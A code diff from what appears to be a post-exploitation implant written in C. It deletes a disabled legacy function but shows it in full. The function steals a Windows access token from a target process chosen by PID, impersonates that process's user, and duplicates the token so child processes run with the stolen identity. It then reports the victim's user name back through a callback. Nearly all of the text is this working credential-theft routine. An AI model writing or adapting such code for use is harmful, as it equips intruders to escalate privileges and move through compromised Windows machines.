@@ -195,69 +195,6 @@ void command_steal_token(char * buffer, int length, void (*callback)(char * buff
 }
 
 /* leftover original body removed */
-#if 0
-void command_steal_token_old(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
-	int pid;
-	HANDLE token = NULL;
-	HANDLE handle = NULL;
-	char name[512];
-
-	/* extract pid from buffer */
-	if (length != 4)
-		return;
-
-	memcpy((char *)&pid, (char *)buffer, 4);
-	pid = ntohl(pid);
-
-	/* obtain a handle to the process we want */
-	handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
-
-	if (!handle) {
-		post_error_dd(0x21, pid, GetLastError());
-		return;
-	}
-
-	/* try to grab that processes's token */
-	if (!OpenProcessToken(handle, TOKEN_ALL_ACCESS, &token)) {
-		post_error_dd(0x24, pid, GetLastError());
-		return;
-	}
-
-	/* at this point, let's drop our old token (assuming we have one) */
-	command_rev2self();
-
-	/* try to steal the token (and this *may* be good enough) */
-	if (!ImpersonateLoggedOnUser(token)) {
-		post_error_dd(0x25, pid, GetLastError());
-		return;
-	}
-
-	/* try to duplicate the token into xtoken... why? So we can propagate it to child processes.
-	   may need to update execute/shell to use a stored xtoken */
-	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &atoken)) {
-		post_error_dd(0x26, pid, GetLastError());
-		return;
-	}
-
-	/* for some reason, I need to do this a second time to make the current thread take on
-	   the impersonated token. *shrug* */
-	if (!ImpersonateLoggedOnUser(atoken)) {
-		post_error_dd(0x27, pid, GetLastError());
-		return;
-	}
-
-	/* clean up, because that's how we do it here... y0 */
-	if (handle)
-		CloseHandle(handle);
-
-	if (token)
-		CloseHandle(token);
-
-	if (token_user(atoken, name, 512)) {
-		callback(name, strlen(name), CALLBACK_TOKEN_STOLEN);
-	}
-}
-#endif
 
 #define TOKEN_STORE_MAX 32
 
